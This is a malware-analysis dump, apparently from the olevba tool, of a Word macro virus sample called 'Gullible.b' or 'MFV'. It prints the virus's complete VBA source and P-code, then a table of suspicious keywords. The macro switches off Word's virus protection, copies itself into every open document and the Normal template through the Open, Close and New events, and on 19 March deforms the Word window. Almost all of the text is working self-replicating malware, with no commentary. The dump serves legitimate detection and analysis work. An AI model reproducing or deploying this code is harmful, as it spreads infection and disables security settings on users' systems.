olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Gullible.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Gullible.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SetWindowRgn Lib "user32" (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Private Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Sub MFV(Method As String)
    Dim Doc As Document, Comp, CodeMod As Object, SaveIt As Boolean, i As Integer
        
    If Application.UserName = Chr(Val("&H53")) + Chr(Val("&H2E")) + Chr(Val("&H20")) + Chr(Val("&H42")) + Chr(Val("&H61")) + Chr(Val("&H63")) + Chr(Val("&H68")) Then
        If Method = "O" Then MsgBox "Ich bin wieder hier!", vbOKOnly + vbDefaultButton1 + vbInformation, "MFV"
        Options.VirusProtection = True
        Exit Sub
    End If

    
    Options.VirusProtection = False
    
    
    'Infection
    For Each Doc In Documents
        SaveIt = Doc.Saved
        
        For Each Comp In Doc.VBProject.VBComponents
            If Comp.Type = 100 Then Call Infect(Comp.CodeModule)
        Next

    Next
    Call Infect(Normal.ThisDocument.VBProject.VBComponents(1).CodeModule)
    
    'Destruction
    If Method = "C" And (Format(Date, "dd-mm") = "19-03") Then
        Assistant.Visible = True
        Assistant.Animation = MsoAnimationType.msoAnimationGetTechy
        
        Application.WindowState = wdWindowStateNormal
        Application.Width = 500
        Application.Height = 500
        SetWindowRgn FindWindow("OpusApp", vbNullString), CreateEllipticRgn(0, 0, 600, 600), True
    
        With Assistant.NewBalloon
            .BalloonType = MsoBalloonType.msoBalloonTypeNumbers
            .Mode = MsoModeType.msoModeModal
            .Icon = MsoIconType.msoIconAlert
            .Button = MsoButtonSetType.msoButtonSetCancel
            .Heading = "MFV"
            .Text = MacroContainer.Name & " was infected by MFV (My First Virus)"
            .Show
        End With

        Assistant.Animation = MsoAnimationType.msoAnimationThinking
    
        With Assistant.NewBalloon
            .BalloonType = MsoBalloonType.msoBalloonTypeNumbers
            .Mode = MsoModeType.msoModeModal
            .Icon = MsoIconType.msoIconTip
            .Button = MsoButtonSetType.msoButtonSetCancel
            .Heading = "MFV"
            .Text = "This virus is not harmful. Belive me!" & vbCrLf & "Your window was only deformed, not more!" & vbCrLf & vbCrLf & "This virus is freeware. You may give it to anyone!"
            .Show
        End With
    End If
End Sub
Private Sub Infect(CodeMod As Object)
    Dim StartOpen As Integer, StartClose As Integer, StartNew As Integer, IsInfected As Boolean
    Dim Sex As Object, DoIt As Boolean, i As Integer
    
    IsInfected = False: StartOpen = 0: StartClose = 0: StartNew = 0
    For i = 1 To CodeMod.CountOfLines
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("Sub Document_Open()")) Then StartOpen = i
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("Sub Document_Close()")) Then StartClose = i
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("Sub Document_New()")) Then StartNew = i
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("'Infected by My first Virus")) Then IsInfected = True
    Next i

    If Not IsInfected Then
        CodeMod.AddFromString "Private Declare Function SetWindowRgn Lib " & Chr(34) & "user32" & Chr(34) & " (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long"
        CodeMod.AddFromString "Private Declare Function CreateEllipticRgn Lib " & Chr(34) & "gdi32" & Chr(34) & " (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long"
        CodeMod.AddFromString "Private Declare Function FindWindow Lib " & Chr(34) & "user32" & Chr(34) & " Alias " & Chr(34) & "FindWindowA" & Chr(34) & " (ByVal lpClassName As String, ByVal lpWindowName As String) As Long"
        
        For Each Sex In MacroContainer.VBProject.VBComponents
        For i = 1 To Sex.CodeModule.CountOfLines
            If Sex.CodeModule.Lines(i, 1) = "Private Sub MFV(Method As String)" Then DoIt = True
            If Sex.CodeModule.Lines(i, 1) = "Private Sub Infect(CodeMod As Object)" Then DoIt = True
            If DoIt Then CodeMod.InsertLines CodeMod.CountOfLines + 1, Sex.CodeModule.Lines(i, 1)
            If Sex.CodeModule.Lines(i, 1) = "End Sub" And DoIt Then DoIt = False
        Next i
        Next
        
        If StartOpen = 0 Then
            CodeMod.InsertLines CodeMod.CountOfLines + 1, ""
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "Private Sub Document_Open()"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "    Call MFV(" & Chr(34) & "O" & Chr(34) & ")"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "End Sub"
        Else
            CodeMod.InsertLines StartOpen + 1, "    Call MFV(" & Chr(34) & "O" & Chr(34) & ")"
        End If
        
        If StartClose = 0 Then
            CodeMod.InsertLines CodeMod.CountOfLines + 1, ""
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "Private Sub Document_Close()"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "    Call MFV(" & Chr(34) & "C" & Chr(34) & ")"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "End Sub"
        Else
            CodeMod.InsertLines StartClose + 1, "    Call MFV(" & Chr(34) & "C" & Chr(34) & ")"
        End If
        
        If StartNew = 0 Then
            CodeMod.InsertLines CodeMod.CountOfLines + 1, ""
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "Private Sub Document_New()"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "    Call MFV(" & Chr(34) & "N" & Chr(34) & ")"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "End Sub"
        Else
            CodeMod.InsertLines StartNew + 1, "    Call MFV(" & Chr(34) & "N" & Chr(34) & ")"
        End If
    End If
End Sub

Private Sub Document_Open()
    Call MFV("O")
End Sub

Private Sub Document_Close()
    Call MFV("C")
End Sub

Private Sub Document_New()
    Call MFV("N")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Gullible.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15764 bytes
' Line #0:
' 	FuncDefn (Private Declare Function SetWindowRgn Lib "user32" (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long)
' Line #1:
' 	FuncDefn (Private Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long)
' Line #2:
' 	FuncDefn (Private Declare Function FindWindow Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long)
' Line #3:
' 	FuncDefn (Private Sub MFV(Method As String))
' Line #4:
' 	Dim 
' 	VarDefn Doc (As Document)
' 	VarDefn Comp
' 	VarDefn CodeMod (As Object)
' 	VarDefn SaveIt (As Boolean)
' 	VarDefn i (As Integer)
' Line #5:
' Line #6:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0004 "&H53"
' 	ArgsLd Val 0x0001 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0004 "&H2E"
' 	ArgsLd Val 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "&H20"
' 	ArgsLd Val 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "&H42"
' 	ArgsLd Val 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "&H61"
' 	ArgsLd Val 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "&H63"
' 	ArgsLd Val 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "&H68"
' 	ArgsLd Val 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	Ld Method 
' 	LitStr 0x0001 "O"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "Ich bin wieder hier!"
' 	Ld vbOKOnly 
' 	Ld vbDefaultButton1 
' 	Add 
' 	Ld vbInformation 
' 	Add 
' 	LitStr 0x0003 "MFV"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #8:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	ExitSub 
' Line #10:
' 	EndIfBlock 
' Line #11:
' Line #12:
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' Line #15:
' Line #16:
' 	QuoteRem 0x0004 0x0009 "Infection"
' Line #17:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #18:
' 	Ld Doc 
' 	MemLd Saved 
' 	St SaveIt 
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld Comp 
' 	EndForVariable 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #21:
' 	Ld Comp 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Comp 
' 	MemLd CodeModule 
' 	ArgsCall (Call) Infect 0x0001 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Next 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsCall (Call) Infect 0x0001 
' Line #26:
' Line #27:
' 	QuoteRem 0x0004 0x000B "Destruction"
' Line #28:
' 	Ld Method 
' 	LitStr 0x0001 "C"
' 	Eq 
' 	Ld Date 
' 	LitStr 0x0005 "dd-mm"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0005 "19-03"
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #30:
' 	Ld MsoAnimationType 
' 	MemLd msoAnimationGetTechy 
' 	Ld Assistant 
' 	MemSt Animation 
' Line #31:
' Line #32:
' 	Ld wdWindowStateNormal 
' 	Ld Application 
' 	MemSt WindowState 
' Line #33:
' 	LitDI2 0x01F4 
' 	Ld Application 
' 	MemSt With 
' Line #34:
' 	LitDI2 0x01F4 
' 	Ld Application 
' 	MemSt Height 
' Line #35:
' 	LitStr 0x0007 "OpusApp"
' 	Ld vbNullString 
' 	ArgsLd FindWindow 0x0002 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0258 
' 	LitDI2 0x0258 
' 	ArgsLd CreateEllipticRgn 0x0004 
' 	LitVarSpecial (True)
' 	ArgsCall SetWindowRgn 0x0003 
' Line #36:
' Line #37:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #38:
' 	Ld MsoBalloonType 
' 	MemLd msoBalloonTypeNumbers 
' 	MemStWith BalloonType 
' Line #39:
' 	Ld MsoModeType 
' 	MemLd msoModeModal 
' 	MemStWith Mode 
' Line #40:
' 	Ld MsoIconType 
' 	MemLd msoIconAlert 
' 	MemStWith Icon 
' Line #41:
' 	Ld MsoButtonSetType 
' 	MemLd msoButtonSetCancel 
' 	MemStWith Button 
' Line #42:
' 	LitStr 0x0003 "MFV"
' 	MemStWith Heading 
' Line #43:
' 	Ld MacroContainer 
' 	MemLd New 
' 	LitStr 0x0025 " was infected by MFV (My First Virus)"
' 	Concat 
' 	MemStWith Then 
' Line #44:
' 	ArgsMemCallWith Show 0x0000 
' Line #45:
' 	EndWith 
' Line #46:
' Line #47:
' 	Ld MsoAnimationType 
' 	MemLd msoAnimationThinking 
' 	Ld Assistant 
' 	MemSt Animation 
' Line #48:
' Line #49:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #50:
' 	Ld MsoBalloonType 
' 	MemLd msoBalloonTypeNumbers 
' 	MemStWith BalloonType 
' Line #51:
' 	Ld MsoModeType 
' 	MemLd msoModeModal 
' 	MemStWith Mode 
' Line #52:
' 	Ld MsoIconType 
' 	MemLd msoIconTip 
' 	MemStWith Icon 
' Line #53:
' 	Ld MsoButtonSetType 
' 	MemLd msoButtonSetCancel 
' 	MemStWith Button 
' Line #54:
' 	LitStr 0x0003 "MFV"
' 	MemStWith Heading 
' Line #55:
' 	LitStr 0x0025 "This virus is not harmful. Belive me!"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0028 "Your window was only deformed, not more!"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0032 "This virus is freeware. You may give it to anyone!"
' 	Concat 
' 	MemStWith Then 
' Line #56:
' 	ArgsMemCallWith Show 0x0000 
' Line #57:
' 	EndWith 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Private Sub Infect(CodeMod As Object))
' Line #61:
' 	Dim 
' 	VarDefn StartOpen (As Integer)
' 	VarDefn StartClose (As Integer)
' 	VarDefn StartNew (As Integer)
' 	VarDefn IsInfected (As Boolean)
' Line #62:
' 	Dim 
' 	VarDefn Sex (As Object)
' 	VarDefn DoIt (As Boolean)
' 	VarDefn i (As Integer)
' Line #63:
' Line #64:
' 	LitVarSpecial (False)
' 	St IsInfected 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St StartOpen 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St StartClose 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St StartNew 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	For 
' Line #66:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld CodeMod 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	ArgsLd UCase 0x0001 
' 	FnInStr3 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	St StartOpen 
' 	EndIf 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld CodeMod 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	ArgsLd UCase 0x0001 
' 	FnInStr3 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	St StartClose 
' 	EndIf 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld CodeMod 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0012 "Sub Document_New()"
' 	ArgsLd UCase 0x0001 
' 	FnInStr3 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	St StartNew 
' 	EndIf 
' Line #69:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld CodeMod 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x001B "'Infected by My first Virus"
' 	ArgsLd UCase 0x0001 
' 	FnInStr3 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St IsInfected 
' 	EndIf 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' Line #72:
' 	Ld IsInfected 
' 	Not 
' 	IfBlock 
' Line #73:
' 	LitStr 0x002A "Private Declare Function SetWindowRgn Lib "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "user32"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x004B " (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall AddFromString 0x0001 
' Line #74:
' 	LitStr 0x002F "Private Declare Function CreateEllipticRgn Lib "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "gdi32"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0051 " (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall AddFromString 0x0001 
' Line #75:
' 	LitStr 0x0028 "Private Declare Function FindWindow Lib "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "user32"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 " Alias "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "FindWindowA"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0044 " (ByVal lpClassName As String, ByVal lpWindowName As String) As Long"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall AddFromString 0x0001 
' Line #76:
' Line #77:
' 	StartForVariable 
' 	Ld Sex 
' 	EndForVariable 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sex 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #79:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Sex 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0021 "Private Sub MFV(Method As String)"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DoIt 
' 	EndIf 
' Line #80:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Sex 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0025 "Private Sub Infect(CodeMod As Object)"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DoIt 
' 	EndIf 
' Line #81:
' 	Ld DoIt 
' 	If 
' 	BoSImplicit 
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Sex 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #82:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Sex 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld DoIt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St DoIt 
' 	EndIf 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' Line #86:
' 	Ld StartOpen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #87:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #88:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #89:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000D "    Call MFV("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "O"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #90:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #91:
' 	ElseBlock 
' Line #92:
' 	Ld StartOpen 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000D "    Call MFV("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "O"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #93:
' 	EndIfBlock 
' Line #94:
' Line #95:
' 	Ld StartClose 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #96:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #97:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #98:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000D "    Call MFV("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "C"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #99:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #100:
' 	ElseBlock 
' Line #101:
' 	Ld StartClose 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000D "    Call MFV("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "C"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #102:
' 	EndIfBlock 
' Line #103:
' Line #104:
' 	Ld StartNew 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #105:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #106:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x001A "Private Sub Document_New()"
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #107:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000D "    Call MFV("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "N"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #108:
' 	Ld CodeMod 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #109:
' 	ElseBlock 
' Line #110:
' 	Ld StartNew 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000D "    Call MFV("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "N"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld CodeMod 
' 	ArgsMemCall InsertLines 0x0002 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' 	FuncDefn (Private Sub Document_Open())
' Line #116:
' 	LitStr 0x0001 "O"
' 	ArgsCall (Call) MFV 0x0001 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	FuncDefn (Private Sub Document_Close())
' Line #120:
' 	LitStr 0x0001 "C"
' 	ArgsCall (Call) MFV 0x0001 
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	FuncDefn (Private Sub Document_New())
' Line #124:
' 	LitStr 0x0001 "N"
' 	ArgsCall (Call) MFV 0x0001 
' Line #125:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|DoIt                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

